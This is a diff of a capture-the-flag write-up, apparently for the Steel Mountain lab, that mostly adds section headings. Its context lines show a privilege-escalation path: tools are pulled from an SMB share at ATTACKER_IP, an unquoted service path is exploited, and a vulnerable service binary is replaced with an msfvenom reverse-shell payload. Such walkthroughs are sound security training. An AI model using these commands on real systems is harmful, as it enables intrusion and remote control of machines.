@@ -94,12 +94,12 @@ STEELMOUNTAIN\bill
 
 
 <br/>
-<br/>
 
-- Using a **Simple `SMB` Server** to Transfer files to the **Target Machine.**
+### SMB
+
+- Using a **Python** `SMB` Server to Transfer files to the **Target Machine.**
 
 ```bash
-attacker@machine:~$ mkdir /mnt/SMBShare
 attacker@machine:~$ smbserver LINUXSHARE /mnt/SMBShare
 ```
 
@@ -112,6 +112,8 @@ C:\Windows\Temp> copy \\ATTACKER_IP\LINUXSHARE\winPEASx64.exe winPEASx64.exe
 ```
 
 <br/>
+
+### Enumeration
 
 - Enumerating the Machine Using <b style={{ color: 'LightGreen' }}>winPEAS</b>
 - The <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service has <b style={{ color: 'Brown' }}>[Unquoted Service Paths] - [CanRestart = True]</b>
@@ -136,7 +138,8 @@ Check          : Unquoted Service Paths
 ```
 
 <br/>
-<br/>
+
+### PAYLOAD
 
 - Generating the **PAYLOAD** with <b style={{ color: 'IndianRed' }}>MSFVenom</b>
 
@@ -146,7 +149,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o
 
 <br/>
 
-- Once again we can Transfer the **PAYLOAD** to the Target Machine using a Simple `SMB` Server.
+- Once again we can Transfer the **PAYLOAD** to the Target Machine using a **Python** `SMB` Server.
 - It is going to ask to Overwrite the file: `Yes`
 
 ```log
@@ -157,7 +160,8 @@ Overwrite ASCService.exe? (Yes/No/All): Yes
 
 
 <br/>
-<br/>
+
+### Exploitation
 
 - Restarting the <b style={{ color: 'PowderBlue' }}>AdvancedSystemCareService9</b> Service will Start our <span style={{fontWeight: 'Bold'}}>Reverse Shell.</span>
 
